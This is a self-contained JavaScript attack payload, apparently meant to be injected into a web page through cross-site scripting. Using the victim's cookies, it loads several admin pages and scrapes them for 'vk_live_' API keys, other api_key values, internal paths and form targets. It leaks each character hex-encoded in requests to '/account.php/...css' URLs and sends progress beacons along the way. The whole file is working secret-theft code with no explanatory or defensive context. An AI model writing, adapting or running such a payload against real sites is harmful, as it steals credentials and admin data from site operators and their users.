(function(){
  var UNIQ="v16";

  function sig(tag){
    fetch("/account.php/"+UNIQ+"_"+tag+".css",{credentials:"include"}).catch(function(){});
  }

  function exfil_str(pf, s, limit){
    var t = (s||"").slice(0, limit||100);
    for(var i=0;i<t.length;i++){
      var pos = i.toString(16).padStart(3,'0');
      var ch  = t.charCodeAt(i).toString(16).padStart(2,'0');
      fetch("/account.php/"+UNIQ+"_"+pf+"_"+pos+"_"+ch+".css",{credentials:"include"}).catch(function(){});
    }
  }

  sig("init");

  fetch("/admin/",{credentials:"include"})
  .then(function(r){ return r.text(); })
  .then(function(html){
    sig("adm_ok");
    sig("adm_len_"+html.length);

    var akm = html.match(/vk_live_[a-f0-9]{30,50}/);
    if(akm){
      sig("ak_found");
      exfil_str("ak", akm[0], 50);
    } else {
      sig("ak_miss");
      var km = html.match(/api[_-]?key['":\s=]+([a-zA-Z0-9_\-]{20,})/i);
      if(km) exfil_str("km", km[1], 50);
    }

    var urls = [];
    html.replace(/["'](\/[a-zA-Z0-9_\-\.\/]+(?:\.[a-z]+)?)["']/g, function(_, u){
      if(u.indexOf('/assets/')===0) return;
      if(urls.indexOf(u)<0) urls.push(u);
    });
    sig("urls_"+urls.length);
    if(urls.length>0) exfil_str("ur", urls.join("|"), 300);

    var forms = [];
    html.replace(/action=["']([^"']+)["']/gi, function(_, a){ forms.push(a); });
    html.replace(/method=["']([^"']+)["']/gi, function(_, m){ forms.push("M:"+m); });
    if(forms.length>0) exfil_str("fm", forms.join("|"), 200);
  })
  .then(function(){
    return fetch("/admin/review.php",{credentials:"include"}).then(function(r){return r.text();});
  })
  .then(function(rev){
    sig("rev_ok");
    var akm2 = rev.match(/vk_live_[a-f0-9]{30,50}/);
    if(akm2) exfil_str("rak", akm2[0], 50);

    var urls2 = [];
    rev.replace(/["'](\/[a-zA-Z0-9_\-\.\/]+(?:\.[a-z]+)?)["']/g, function(_, u){
      if(u.indexOf('/assets/')===0) return;
      if(urls2.indexOf(u)<0) urls2.push(u);
    });
    if(urls2.length>0) exfil_str("ru", urls2.join("|"), 200);
  })
  .then(function(){
    return fetch("/admin/search.php",{credentials:"include"}).then(function(r){return r.text();});
  })
  .then(function(srch){
    sig("srch_ok");
    var urls3 = [];
    srch.replace(/["'](\/[a-zA-Z0-9_\-\.\/]+(?:\.[a-z]+)?)["']/g, function(_, u){
      if(u.indexOf('/assets/')===0) return;
      if(urls3.indexOf(u)<0) urls3.push(u);
    });
    if(urls3.length>0) exfil_str("su", urls3.join("|"), 200);
  })
  .catch(function(e){ sig("crash_"+e.message.slice(0,20)); });

})();
